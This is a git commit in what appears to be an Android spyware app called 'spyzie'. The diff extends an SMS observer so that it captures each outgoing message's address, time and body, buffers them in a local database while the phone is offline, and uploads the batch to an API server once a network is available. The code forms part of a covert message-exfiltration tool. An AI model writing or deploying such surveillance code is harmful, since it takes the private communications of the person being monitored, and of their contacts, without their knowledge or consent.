82588215a243cda1d922cf3e817e0493d8d622c9
Tran Duc Tan <tantd90.ktmt@gmail.com>
2020-04-13 20:55:02 +0700

    Save and send SMS data

--- app/src/main/java/com/tantd/spyzie/receiver/SmsObserver.java
+++ app/src/main/java/com/tantd/spyzie/receiver/SmsObserver.java
@@ -6,17 +6,29 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 
+import com.tantd.spyzie.data.db.AppDbManager;
+import com.tantd.spyzie.data.db.DbManager;
 import com.tantd.spyzie.data.model.Sms;
+import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.data.network.AppApiManager;
+import com.tantd.spyzie.util.Constants;
+import com.tantd.spyzie.util.NetworkUtils;
+
+import java.util.List;
 
 public class SmsObserver extends ContentObserver {
 
     private long lastSmsId;
     private Context mContext;
 
+    private DbManager mDbManager;
+    private ApiManager mApiManager;
+
     public SmsObserver(Handler handler, Context context) {
         super(handler);
         mContext = context;
+        mDbManager = AppDbManager.getInstance();
+        mApiManager = AppApiManager.getInstance();
     }
 
     @Override
@@ -31,7 +43,19 @@ public class SmsObserver extends ContentObserver {
                 long time = cursor.getLong(cursor.getColumnIndex("date"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
                 lastSmsId = id;
-                AppApiManager.getInstance().sendSmsData(new Sms(id, address, time, body, false));
+
+                Sms outgoingSms = new Sms(id, address, time, body, false);
+                if (NetworkUtils.isNetworkConnected(mContext)) {
+                    List<Sms> savedData = (List<Sms>) mDbManager.find(Sms.class, 0, Constants.MAX_READ_DATA_ENTRIES);
+                    savedData.add(outgoingSms);
+                    mApiManager.sendSmsData(savedData);
+                    savedData.remove(savedData.size() - 1);
+                    if (savedData.size() > 0) {
+                        mDbManager.removeSms(savedData);
+                    }
+                } else {
+                    mDbManager.put(outgoingSms);
+                }
             }
         }
     }
